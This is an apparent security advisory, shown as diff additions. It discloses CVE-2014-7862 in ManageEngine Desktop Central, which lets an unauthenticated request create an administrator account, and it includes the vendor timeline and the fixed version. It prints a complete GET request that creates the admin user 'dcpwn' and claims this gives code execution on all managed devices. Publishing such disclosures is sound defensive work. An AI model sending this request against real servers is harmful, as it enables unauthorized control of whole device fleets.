@@ -1,0 +1,52 @@
+>> Administrator account creation in ManageEngine Desktop Central / Desktop Central MSP
+>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
+=================================================================================
+Disclosure: 31/12/2014 / Last updated: 05/01/2015
+
+>> Background on the affected product:
+"Desktop Central is an integrated desktop & mobile device management software that helps in managing the servers, laptops, desktops, smartphones and tablets from a central point. It automates your regular desktop management routines like installing patches, distributing software, managing your IT Assets, managing software licenses, monitoring software usage statistics, managing USB device usage, taking control of remote desktops, and more."
+
+This vulnerability is being released as a 0day since ManageEngine failed to take action after 112 days. See timeline for details.
+
+>> Technical details:
+Vulnerability: Administrator account creation (unauthenticated)
+CVE-2014-7862
+Constraints: none; no authentication or any other information needed
+Affected versions: all versions from v7 onwards
+
+GET /servlets/DCPluginServelet?action=addPlugInUser&role=DCAdmin&userName=dcpwn&email=bla@bla.com&phNumber=123456&password=8fR%2bRoOURmY0EXsX%2bCmung%3d=&salt=1401192012599&createdtime=1337
+
+This creates a new administrator user "dcpwn" with the password "admin". You can now execute code on all devices managed by Desktop Central!
+A Metasploit auxiliary module that exploits this vulnerability has been released.
+
+>> Fix: 
+(updated 05/01/2015) Upgrade to version 9.0 build 90109 or later.
+
+This vulnerability was initially disclosed on 31/12/2014 as a 0-day, as ManageEngine failed to take action after 112 days.
+
+Timeline of disclosure:
+11/09/2014:
+- Vulnerability information sent to Romanus, Desktop Central project manager.
+
+23/09/2014:
+- Requested an update. Received reply "My development team is working on this to provide a fix. Let me check this and update you the status."
+
+17/10/2014
+- Requested an update. Received reply on the 19th "Due to festive season here i'm unable to get the update. Let me find this and update you by Monday."
+
+30/10/2014
+- Requested an update. Received reply "The development and testing of the reported part should get over in another 3 weeks and when it is ready for release build I'll send it for testing."
+
+23/11/2014
+- Requested an update. Received reply on the 24th "I was traveling hence couldn't give you an update.  It should get released by next week or early second week. I'll send you an update on this."
+
+15/12/2014
+- Requested an update. Received reply on the 18th "it has been handled from the Desktop Central side and awaiting for the release".
+
+31/12/2014
+- Released information and exploit 112 days after initial disclosure.
+
+================
+Agile Information Security Limited
+http://www.agileinfosec.co.uk/
+>> Enabling secure digital business >>
